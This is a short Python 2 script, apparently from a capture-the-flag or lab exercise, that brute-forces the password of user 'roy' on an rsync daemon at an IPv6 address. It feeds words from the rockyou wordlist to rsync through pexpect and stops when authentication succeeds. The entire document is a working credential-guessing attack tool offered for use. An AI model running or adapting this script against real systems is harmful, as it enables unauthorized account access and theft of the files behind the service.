#!/bin/python2
import pexpect

COMMAND = "rsync -6 -rdt rsync://roy@[dead:beef::250:56ff:feb9:6611]:8730/home_roy home"
LIST = "/usr/share/wordlists/rockyou.txt"


print("[!] Bruteforce start")
wordlist = open(LIST,'r')
for word in wordlist:
    #print("[?] Trying: {}".format(word))
    child = pexpect.spawn(COMMAND)
    child.expect('Password:')
    child.sendline(word)
    if 'auth failed on module' not in child.read():
        print("[+] Password found: {}".format(word))
        break
